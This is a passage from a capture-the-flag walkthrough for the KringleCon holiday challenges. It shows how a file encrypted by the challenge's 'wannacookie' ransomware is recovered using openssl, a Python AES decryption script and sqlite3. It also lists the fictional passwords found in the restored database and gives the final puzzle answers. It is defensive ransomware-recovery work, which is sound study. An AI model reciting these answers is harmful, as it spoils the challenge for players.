3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
```

As a result, I can probably guess that `$p_k_e_k` is `3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971`.

Next, decrypt `$p_k_e_k` with the previously obtained `server.key`, and get the 16-byte AES encryption key.

```
root@kali~/work# echo 3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971 | xxd -r -p > cipher.bin

root@kali~/work# openssl rsautl -decrypt -inkey server.key -in cipher.bin -oaep | hexdump -C
00000000  fb cf c1 21 91 5d 99 cc  20 a3 d3 d5 d8 4f 83 08  |...!.].. ....O..|
00000010
```

The encryption key of AES is `fbcfc121915d99cc20a3d3d5d84f8308`.
Finally decrypt the `alabaster_passwords.elfdb.wannacookie`.

The AES IV is stored at the beginning of the ABC file.
`Length of IV`  is 0x00000010 bytes(16 bytes)
`IV` is `1f98ac13b187f791ab42b24bcd7fed55`
`Encrypted Data` is `f1307a23....`.

```
root@kali~/work# hexdump -C alabaster_passwords.elfdb.wannacookie | head -n 3
00000000  10 00 00 00 1f 98 ac 13  b1 87 f7 91 ab 42 b2 4b  |.............B.K|
00000010  cd 7f ed 55 f1 30 7a 23  5b f9 e9 08 8a 33 80 db  |...U.0z#[....3..|
00000020  2c 87 c4 de 3b 43 6d a8  df e5 af 73 49 f7 00 3d  |,...;Cm....sI..=|
```

Decrypt `alabaster_passwords.elfdb.wannacookie` with python script.

```python
from Crypto.Cipher import AES

f   = open("alabaster_passwords.elfdb.wannacookie", "rb").read()
out = open("alabaster_passwords.elfdb", "wb")

key = "\xfb\xcf\xc1\x21\x91\x5d\x99\xcc\x20\xa3\xd3\xd5\xd8\x4f\x83\x08"

iv = f[4:20]
enc = f[20:]

aes = AES.new(key, AES.MODE_CBC, iv)
dec = aes.decrypt(enc)

out.write(dec)
out.close()
```

```
root@kali~/work# python 0904_decrypt_wannacookie.py

root@kali~/work# file alabaster_passwords.elfdb
alabaster_passwords.elfdb: SQLite 3.x database, last written using SQLite version 3015002

root@kali~/work# sqlite3 alabaster_passwords.elfdb
SQLite version 3.26.0 2018-12-01 12:34:55
Enter ".help" for usage hints.
sqlite> .tables
passwords
sqlite> .schema passwords
CREATE TABLE IF NOT EXISTS "passwords" (
        `name`  TEXT NOT NULL,
        `password`      TEXT NOT NULL,
        `usedfor`       TEXT NOT NULL
);
sqlite> select * from passwords;
alabaster.snowball|CookiesR0cK!2!#|active directory
alabaster@kringlecastle.com|KeepYourEnemiesClose1425|www.toysrus.com
alabaster@kringlecastle.com|CookiesRLyfe!*26|netflix.com
alabaster.snowball|MoarCookiesPreeze1928|Barcode Scanner
alabaster.snowball|ED#ED#EED#EF#G#F#G#ABA#BA#B|vault
alabaster@kringlecastle.com|PetsEatCookiesTOo@813|neopets.com
alabaster@kringlecastle.com|YayImACoder1926|www.codecademy.com
alabaster@kringlecastle.com|Woootz4Cookies19273|www.4chan.org
alabaster@kringlecastle.com|ChristMasRox19283|www.reddit.com
```

The password is `ED#ED#EED#EF#G#F#G#ABA#BA#B` for the Vault entry.

### 10 : Who Is Behind It All?
`Who was the mastermind behind the whole KringleCon plan?`

In order to obtain this answer it is necessary to solve the challenge of Pianolock and open the door.

#### Pianolock
`Use what you have learned from previous challenges to open the door to Santa's vault. What message do you get when you unlock the door?`

<img src=img/10-01_Pianolock.PNG width=500px />

I tried `ED#ED#EED#EF#G#F#G#ABA#BA#B` which is answer of the previous problem.

<img src=img/10-02_ans09.PNG width=500px />

But the key isn't right.

> Hint: Alabaster said "`Really, it's Mozart. And it should be in the key of D, not E.`".

I tried to down a whole step from E to D.
`DC#DC#DDC#DEF#EF#GAG#AG#A`

As a result, I got the message `You have unlocked Santa's vault!` and the door opened.

#### In Santa's vault
Santa said `I came up with the idea of KringleCon to find someone like you who could help me defend the North Pole against even the craftiest attackers.`

So the mastermind behind the whole KringleCon plan is `Santa`.

